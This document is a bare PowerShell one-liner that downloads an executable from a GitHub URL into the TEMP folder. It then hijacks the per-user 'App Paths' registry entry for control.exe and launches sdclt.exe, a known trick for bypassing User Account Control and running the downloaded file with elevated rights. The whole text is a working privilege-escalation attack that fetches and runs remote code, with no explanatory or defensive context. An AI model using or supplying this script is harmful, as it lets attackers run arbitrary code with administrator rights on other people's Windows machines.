Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe"; Set-Location -Path "$env:TEMP"; New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe' -Force; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe' -Name '(Default)' -Value "$env:TEMP\dos.exe" -Force; Start-Process "C:\\Windows\\System32\\sdclt.exe"
